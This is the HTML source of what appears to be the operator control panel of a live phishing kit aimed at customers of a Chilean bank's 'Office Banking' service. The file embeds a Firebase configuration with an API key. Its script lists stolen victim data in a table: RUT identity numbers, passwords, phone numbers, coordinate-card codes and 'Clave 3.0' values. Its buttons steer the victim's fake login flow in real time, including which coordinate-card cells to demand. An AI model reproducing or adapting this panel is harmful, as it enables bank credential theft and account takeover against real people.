<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel de Control</title>
  <style>
    body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
    button { margin: 4px; padding: 10px; }
    table { width: 100%; margin-top: 20px; border-collapse: collapse; background: white; }
    th, td { padding: 8px; border: 1px solid #ccc; text-align: center; }
    input.coord { width: 40px; text-align: center; font-size: 16px; margin: 0 5px; }
  </style>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };
    firebase.initializeApp(firebaseConfig);

    function setModo(valor) {
      firebase.database().ref("modo_asistente").set(valor);
    }

    function enviarEstado(valor) {
      firebase.database().ref("validacion_estado").set(valor);
    }

    function actualizarCoordenadas() {
      const c1 = document.getElementById("coord1").value;
      const c2 = document.getElementById("coord2").value;
      const c3 = document.getElementById("coord3").value;
      firebase.database().ref("coordenadas_temporales").set({c1, c2, c3});
    }

    function cargarRegistros() {
      const tabla = document.getElementById("registros");
      firebase.database().ref("usuarios").on("value", snapshot => {
        const data = snapshot.val();
        tabla.innerHTML = "<tr><th>Fecha</th><th>RUT</th><th>Clave</th><th>Tel√©fono</th><th>Coordenadas</th><th>Clave 3.0</th></tr>";
        for (const key in data) {
          const row = data[key];
          const tr = document.createElement("tr");
          tr.innerHTML = `
            <td>${row.timestamp || ""}</td>
            <td>${row.rut || ""}</td>
            <td>${row.password || ""}</td>
            <td>${row.telefono || ""}</td>
            <td>${row.coordenadas || ""}</td>
            <td>${row.clave3 || ""}</td>
          `;
          tabla.appendChild(tr);
        }
      });
    }

    window.onload = cargarRegistros;
  </script>
</head>
<body>
  <h2>Panel de Control</h2>

  <div>
    <h3>Modo Asistente</h3>
    <button onclick="setModo('activo')">üî¥ Activar</button>
    <button onclick="setModo('inactivo')">‚ö™ Desactivar</button>
  </div>

  <div>
    <h3>Control de Flujo</h3>
    <button onclick="enviarEstado('siguiente')">‚úÖ Siguiente</button>
    <button onclick="enviarEstado('error')">‚ùå Datos ingresados Incorrectos</button>
  </div>

  <div>
    <h3>Coordenadas Solicitadas</h3>
    <input id="coord1" class="coord" maxlength="2" /> 
    <input id="coord2" class="coord" maxlength="2" /> 
    <input id="coord3" class="coord" maxlength="2" />
    <button onclick="actualizarCoordenadas()">Enviar</button>
  </div>

  <table id="registros">
    <tr><th>Fecha</th><th>RUT</th><th>Clave</th><th>Tel√©fono</th><th>Coordenadas</th><th>Clave 3.0</th></tr>
  </table>
</body>
</html>
